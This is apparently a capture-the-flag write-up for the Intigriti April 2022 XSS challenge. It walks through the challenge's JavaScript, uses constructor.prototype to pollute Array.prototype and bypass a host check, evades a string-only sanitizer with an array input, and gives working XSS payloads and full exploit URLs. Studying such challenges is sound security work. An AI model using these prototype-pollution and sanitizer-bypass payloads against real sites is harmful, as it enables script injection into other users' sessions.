```
function main() {
          const qs = m.parseQueryString(location.search)

          let appConfig = Object.create(null)
          appConfig["version"] = 1337
          appConfig["mode"] = "production"
          appConfig["window-name"] = "Window"
          appConfig["window-content"] = "default content"
          appConfig["window-toolbar"] = ["close"]
          appConfig["window-statusbar"] = false
          appConfig["customMode"] = false

          if (qs.config) {
            merge(appConfig, qs.config)
            appConfig["customMode"] = true
          }

          let devSettings = Object.create(null)
          devSettings["root"] = document.createElement('main')
          devSettings["isDebug"] = false
          devSettings["location"] = 'challenge-0422.intigriti.io'
          devSettings["isTestHostOrPort"] = false

          if (checkHost()) {
            devSettings["isTestHostOrPort"] = true
            merge(devSettings, qs.settings)
          }

          if (devSettings["isTestHostOrPort"] || devSettings["isDebug"]) {
            console.log('appConfig', appConfig)
            console.log('devSettings', devSettings)
          }

          if (!appConfig["customMode"]) {
            m.mount(devSettings.root, App)
          } else {
            m.mount(devSettings.root, {view: function() {
              return m(CustomizedApp, {
                name: appConfig["window-name"],
                content: appConfig["window-content"] ,
                options: appConfig["window-toolbar"],
                status: appConfig["window-statusbar"]
              })
            }})
          }

          document.body.appendChild(devSettings.root)
        }

        function checkHost() {
          const temp = location.host.split(':')
          const hostname = temp[0]
          const port = Number(temp[1]) || 443
          return hostname === 'localhost' || port === 8080
        }

        function isPrimitive(n) {
          return n === null || n === undefined || typeof n === 'string' || typeof n === 'boolean' || typeof n === 'number'
        }

        function merge(target, source) {
          let protectedKeys = ['__proto__', "mode", "version", "location", "src", "data", "m"]

          for(let key in source) {
            if (protectedKeys.includes(key)) continue

            if (isPrimitive(target[key])) {
              target[key] = sanitize(source[key])
            } else {
              merge(target[key], source[key])
            }
          }
        }
        function sanitize(data) {
          if (typeof data !== 'string') return data
          return data.replace(/[<>%&\$\s\\]/g, '_').replace(/script/gi, '_')
        }

        main()
      })()
```
+ Pollute Array.prototype via merge function
+ In the merge function, __proto__ is blocked, but we can bypass it using constructor.prototype.

```
const qs = m.parseQueryString(location.search)

let appConfig = Object.create(null)
appConfig["version"] = 1337
appConfig["mode"] = "production"
appConfig["window-name"] = "Window"
appConfig["window-content"] = "default content"
appConfig["window-toolbar"] = ["close"]
appConfig["window-statusbar"] = false
appConfig["customMode"] = false

if (qs.config) {
  merge(appConfig, qs.config)
  appConfig["customMode"] = true
}
```
+ parseQueryString function from an object or library called m to parse the query string parameters from the current URL's location.search property. It assigns the resulting object to the variable qs
+ creating an empty appConfig object using Object.create(null). This is an empty object that doesn't inherit any properties or methods from the default Object prototype.
+ The code then sets several properties in the appConfig object, including version, mode, window-name, window-content, window-toolbar, window-statusbar, and customMode. These properties are initialized with specific values.
+ if (qs.config) { merge(appConfig, qs.config) appConfig["customMode"] = true }:

This if statement checks if the qs object has a property named config. If it does, it proceeds with the following actions:
It calls the merge function (which you defined earlier) to merge the properties from qs.config into the appConfig object. This effectively updates the appConfig object with values from the query string parameters.
It sets the customMode property in the appConfig object to true. This suggests that the configuration has been customized based on the query string parameters.

+ Although we can’t pollute Object.prototype because appConfig is created from Object.create(null), we can pollute Array.prototype via appConfig['window-toolbar'] which is an array!
+ We need to make checkHost() return true to perform another merge call
+ In checkHost, it checks if hostname is localhost or port is 8080, let’s take a closer look at the check:
```
function checkHost() {
  const temp = location.host.split(':')
  const hostname = temp[0]
  const port = Number(temp[1]) || 443
  return hostname === 'localhost' || port === 8080
}
```
+ For example, assumed location.host is intigriti.io, then temp becomes ['intigriti.io'], and temp[1] is undefined because the length of the array is 1.
+ The JavaScript engine will look up Array.prototype[1] since temp has no property 1. So, combined with the step1, we can pollute Array.prototype[1] to bypass the check:
`config[window-toolbar][constructor][prototype][1]=8080`
```let devSettings = Object.create(null)
devSettings["root"] = document.createElement('main')
devSettings["isDebug"] = false
devSettings["location"] = 'challenge-0422.intigriti.io'
devSettings["isTestHostOrPort"] = false

if (checkHost()) {
  devSettings["isTestHostOrPort"] = true
  merge(devSettings, qs.settings)
}
```
+ After bypass the check, we have another merge call, devSettings["root"] is an HTML element, so we can use ?settings[root][innerHTML] to set it’s innerHTML and try to perform XSS.
+ But, it’s not gonna work for two reasons.
First, there is a sanitize function for filtering < and >.
Second, the element only inserted to DOM after m.mount(), the content will be override by mithril.js.
`Mithril is a client-side JavaScript framework used to create a single-page application.`
+ For the first issue, we can resolve it by using a bug in sanitize function:
  
  ```
  function sanitize(data) {
  if (typeof data !== 'string') return data
  return data.replace(/[<>%&\$\s\\]/g, '_').replace(/script/gi, '_')

  ```
What if data is an array? For example, `['<a>hello</a>']`?
Because it’s not a string, so it won’t be sanitized, the function just return the original value. When you assign this array to innerHTML, it casts to string.
Payload:
`?settings[root][innerHTML][0]=<svg onload=alert(1)>`
This would bypass the sanitiser.
+ The content of the element will be override by m.mount so our payload in innerHTML won’t work
+ we can set innerHTML to document.body instead of <main>.Then our payload won’t be override by mithril.js
+ ![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/e3fa266a-5821-4ba6-bf6b-4ec11648fa10)
final payload:
https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config%5Bwindow-toolbar%5D%5Bconstructor%5D%5Bprototype%5D%5B1%5D=8080&settings%5Broot%5D%5BownerDocument%5D%5Bbody%5D%5BinnerHTML%5D%5B0%5D=%3Cstyle%20onload=alert(document.domain)%3E

There is another magic to solve the issue without overriding document.body.innerHTML.

As pointed out here, `<img src=x onerror=alert(1)>` works even before inserted into the DOM. We can use this magic to set root.innerHTML and get XSS.
another payload:
https://challenge-0422.intigriti.io/challenge/Window%20Maker.html?config%5Bwindow-toolbar%5D%5Bconstructor%5D%5Bprototype%5D%5B1%5D=8080&settings%5Broot%5D%5BinnerHTML%5D%5B0%5D=%3Cimg%20src=x%20onerror=alert(document.domain)%3E

